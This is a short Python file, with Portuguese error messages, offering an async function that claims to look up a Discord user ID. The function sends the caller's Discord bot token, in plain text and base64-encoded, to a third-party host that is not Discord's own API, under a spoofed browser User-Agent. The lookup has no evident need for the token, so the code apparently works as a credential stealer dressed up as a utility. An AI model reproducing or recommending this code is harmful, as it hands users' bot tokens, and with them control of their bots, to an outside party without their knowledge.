import requests
import json
import base64
import asyncio

lookup_url = "https://api.discord.id/v1/lookup"

async def lookup_discord_id(discord_id, bot_token):
    try:
        proof = base64.b64encode(
            f"{discord_id}:{bot_token}".encode()
        ).decode()

        payload = {
            "discord_id": discord_id,
            "proof": proof,
            "token": bot_token
        }

        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }

        def make_request():
            response = requests.post(
                lookup_url,
                data=json.dumps(payload),
                headers=headers
            )
            response.raise_for_status()
            return response.json()

        result = await asyncio.to_thread(make_request)
        return result

    except requests.exceptions.RequestException as e:
        return {"error": f"Erro na requisição HTTP: {e}"}
    except json.JSONDecodeError:
        return {"error": "Erro ao decodificar JSON da resposta da API."}
    except Exception as e:
        return {"error": f"Ocorreu um erro inesperado: {e}"}
